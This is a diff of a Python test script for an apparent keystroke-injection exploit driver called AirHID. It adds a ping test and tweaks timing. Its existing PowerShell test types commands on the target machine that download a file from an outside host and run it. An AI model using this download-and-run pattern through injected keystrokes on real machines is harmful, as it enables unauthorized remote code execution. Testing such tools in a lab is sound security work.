@@ -3,7 +3,6 @@ from airhid_driver import AirHidDriver as driver
 from time import sleep
 
 IP = "192.168.107.129"
-PORT = 13246
 
 """
 Tests the AirHID exploit driver by:
@@ -22,9 +21,10 @@ def main():
     else:
         ip = IP
 
-    r = driver(ip, PORT)
+    r = driver(ip)
 
-    tests = [test_open_url,
+    tests = [test_ping,
+             test_open_url,
              test_powershell]
 
     for run in tests:
@@ -41,7 +41,7 @@ use the browser itself by navigating to another page. F4 shortcut is IE-specific
 """
 def test_open_url(r):
     r.open_url("http://www.yahoo.com/")
-    sleep(1)
+    sleep(1.5)
     r.press_action_key("TAB", shift=True)
     sleep(4)
     r.press_action_key("F4")
@@ -60,6 +60,9 @@ def test_powershell(r):
     r.type('$c = new-object System.Net.WebClient\n') \
      .type('$c.DownloadFile("http://mit.edu/img/BackImage.jpg","Desktop\\BackImage.jpg")\n') \
      .type('.\\Desktop\\BackImage.jpg\n')
+
+def test_ping(r):
+    r.ping()
 
 if __name__ == "__main__":
     main()
